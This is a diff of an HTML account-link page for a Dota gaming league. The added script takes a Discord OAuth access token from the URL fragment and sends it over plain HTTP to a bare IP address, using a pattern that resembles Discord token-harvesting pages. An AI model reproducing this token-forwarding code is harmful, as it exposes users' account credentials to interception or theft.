@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gargamel League | Authentication</title>
+  <title>Gargamel Dota League Authentication Page</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
@@ -38,7 +38,7 @@
 
     .system-header {
       text-align: center;
-      margin-bottom: 0px;
+      margin-bottom: 30px;
     }
 
     .logo-title {
@@ -51,18 +51,18 @@
     .logo-image {
       max-width: 200px;
       height: auto;
-      margin-bottom: 0px;
+      margin-bottom: 8px;
     }
 
-    .auth-title {
+    .auth-title, .success-title, .error-title {
       font-size: 1.5rem;
       font-weight: 600;
       color: #2c3e50;
-      margin-bottom: 10px;
+      margin-bottom: 20px;
       text-align: center;
     }
 
-    .auth-description {
+    .auth-description, .status-message {
       font-size: 1rem;
       color: #555;
       margin-bottom: 30px;
@@ -89,6 +89,10 @@
       background: #3b84b3;
     }
 
+    .state-hidden {
+      display: none;
+    }
+
     @media (max-width: 480px) {
       .terminal-window {
         padding: 24px;
@@ -111,16 +115,67 @@
       <div class="logo-title">Gargamel Dota League</div>
       <img class="logo-image" src="GargamelPuppets.png" alt="Gargamel League Logo">
     </div>
-    <div class="auth-title">Account Link Required</div>
-    <div class="auth-description">
-      To participate in Gargamel League matches, you need to link your Discord account to your Steam account.<br><br>
-      Click the button below to join the Gargamel Discord Server and complete the Steam Account Link process.
+
+    <div id="auth-state" class="state-hidden">
+      <div class="auth-title">Account Link Required</div>
+      <div class="auth-description">
+        To participate in Gargamel League matches, you need to link your Discord account to your Steam account.<br>
+        Click the button below to authenticate and complete the connection.
+      </div>
+      <a id="neural-login" class="authenticate-button"
+        href="https://discord.com/oauth2/authorize?client_id=822929136711893063&response_type=token&redirect_uri=http%3A%2F%2F104.248.53.168%2F&scope=identify+connections+guilds.join">
+        Link Discord & Steam
+      </a>
     </div>
-    <a id="authentication-login" class="authenticate-button"
-      href="https://discord.com/oauth2/authorize?client_id=822929136711893063&response_type=token&redirect_uri=http%3A%2F%2F104.248.53.168%2F&scope=identify+connections+guilds.join">
-      Link Discord & Steam
-    </a>
+
+    <div id="success-state" class="state-hidden">
+      <div class="success-title">✅ Connection Successful</div>
+      <div class="status-message">Your Discord account has been successfully linked to your Steam account.</div>
+    </div>
+
+    <div id="error-state" class="state-hidden">
+      <div class="error-title">❌ Connection Failed</div>
+      <div class="status-message">There was a problem linking your accounts. Please try again.</div>
+      <button class="authenticate-button" onclick="location.reload()">Retry</button>
+    </div>
   </div>
+
+  <script>
+    function showState(stateName) {
+      const states = ['auth-state', 'success-state', 'error-state'];
+      states.forEach(state => {
+        const el = document.getElementById(state);
+        if (el) el.style.display = 'none';
+      });
+
+      const newState = document.getElementById(stateName);
+      if (newState) newState.style.display = 'block';
+    }
+
+    window.onload = () => {
+      const fragment = new URLSearchParams(window.location.hash.slice(1));
+      const [accessToken, tokenType] = [fragment.get('access_token'), fragment.get('token_type')];
+
+      if (!accessToken) {
+        showState('auth-state');
+        return;
+      }
+
+      fetch('http://104.248.53.168/', {
+        method: 'PUT',
+        body: JSON.stringify({ accessToken, tokenType }),
+        headers: { 'Content-Type': 'application/json' }
+      }).then(response => {
+        if (response.ok) {
+          showState('success-state');
+        } else {
+          showState('error-state');
+        }
+      }).catch(() => {
+        showState('error-state');
+      });
+    };
+  </script>
 </body>
 
 </html>
